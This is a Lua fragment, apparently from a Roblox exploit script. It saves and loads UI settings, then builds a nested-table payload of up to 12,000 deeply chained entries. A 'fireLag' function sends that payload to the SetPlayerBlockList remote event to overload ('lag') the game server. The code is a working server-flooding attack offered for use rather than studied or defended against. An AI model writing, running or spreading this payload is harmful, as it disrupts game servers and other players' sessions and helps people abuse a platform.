local function saveConfig()
    pcall(function()
        writefile(CONFIG_FILE, HttpService:JSONEncode({
            Keybind = keybind.Name,
            Level   = currentLevel,
            Locked  = windowLocked,
            Mobile  = isMobile,
        }))
    end)
end

local function loadConfig()
    pcall(function()
        if isfile and isfile(CONFIG_FILE) then
            local d = HttpService:JSONDecode(readfile(CONFIG_FILE))
            keybind      = Enum.KeyCode[d.Keybind] or DEFAULT_KEY
            currentLevel = d.Level  or "Low"
            windowLocked = d.Locked or false
            isMobile     = d.Mobile or false
        end
    end)
end
loadConfig()

local payloadCache = {}
local function getPayload(power)
    if payloadCache[power] then return payloadCache[power] end
    local chain = {}; local last = chain
    for _ = 1, 25 do local t = {}; table.insert(last, t); last = t end
    local max  = math.min(12000, power * 50)
    local main = {}
    for _ = 1, max do table.insert(main, chain) end
    payloadCache[power] = main
    return main
end

local lagThread = nil
local function fireLag(power)
    pcall(function()
        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(getPayload(power))
    end)
end

